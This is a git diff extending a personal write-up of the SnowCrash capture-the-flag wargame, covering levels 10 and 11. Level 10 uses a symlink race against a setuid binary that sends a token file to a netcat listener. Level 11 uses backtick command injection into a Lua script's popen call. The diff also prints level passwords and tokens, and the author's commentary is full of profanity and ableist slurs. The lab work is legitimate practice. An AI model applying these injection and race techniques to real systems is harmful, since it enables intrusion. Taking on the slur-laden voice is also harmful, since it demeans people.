@@ -493,4 +493,81 @@ level07@SnowCrash:~$ su level08
 Password:fiumuikeil55xe9cu4dood66h
 ```
 *yay, stupid shell*
-## level09
+## level10
+```
+level10@SnowCrash:~$ ./level10 token [host_ip]
+You don't have access to token
+```
+and on my host machine
+```
+➜  snowcrash git:(master) ✗ nc -l 6969
+```
+*sending /bin/ls as the first arg prints the content of binary /bin/ls client side, fucking useless*
+
+**binary ninja**, the executable calls function **access** that returns 0 if we can access file and -1 otherwise
+
+#### trying to override eax since it's the register containing the return of access
+using **(gdb) set $eax=0**
+
+Well that was a fucking stupid idea, nothing happened 
+
+Executable checks access if 0 then connects to socket then sends content of file?
+
+### stupid idea, not mine, spamming symbolic link to token by making a loop that creates one switches it and deletes it etc
+*fucking kill me for fuck's sake, how the fuck is this even a fucking idea*
+
+I guess printing the retarded message right before the file content is not random
+```
+.*( )*.
+```
+*this fucking bullshit is for slowing down connection to socket, so need to exploit that*
+```
+.*( )*.
+woupa2yuojeeaaed06riuj63c
+.*( )*.
+woupa2yuojeeaaed06riuj63c
+```
+*kill me*
+```
+level10@SnowCrash:~$ su flag10
+Password: 
+Don't forget to launch getflag !
+flag10@SnowCrash:~$ getflag
+Check flag.Here is your token : feulo4b72j7edeahuete3no7c
+```
+## level11
+*fucking lua, of course*
+```
+level11@SnowCrash:~$ ls -al level11.lua 
+-rwsr-sr-x 1 flag11 level11 668 Mar  5  2016 level11.lua
+```
+*nice*
+
+I noticed in previous challenges in output of ps -ef a process running this script
+```
+flag11    1807     1  0 19:30 ?        00:00:00 lua /home/user/level11/level11.lua
+```
+script binds socket to 127.0.0.1 port 5151, I dgaf, kill me 
+```
+level11@SnowCrash:~$ nc 127.0.0.1 5151
+Password: `getflag`
+Erf nope..
+```
+*of course it's a stupid idea*
+
+script hashed input and does useless shit to it and no matter the input, will display either **"Erf nope..\n"** or **"Gz you dumb*\n"**, so what's the point in being alive
+```
+prog = io.popen("echo "..pass.." | sha1sum", "r")
+```
+*that looks suspicious, an **echo**, but that message doesnt even get displayed
+```
+Password: level11@SnowCrash:~$ nc 127.0.0.1 5151
+Password: `getflag > /tmp/a`
+Erf nope..
+level11@SnowCrash:~$ cat /tmp/a
+Check flag.Here is your token : fa6v5ateaw21peobuub8ipe6s
+level11@SnowCrash:~$ su level12
+Password:fa6v5ateaw21peobuub8ipe6s
+```
+*oups, fucking retard*
+## level12, fucking perl again?????
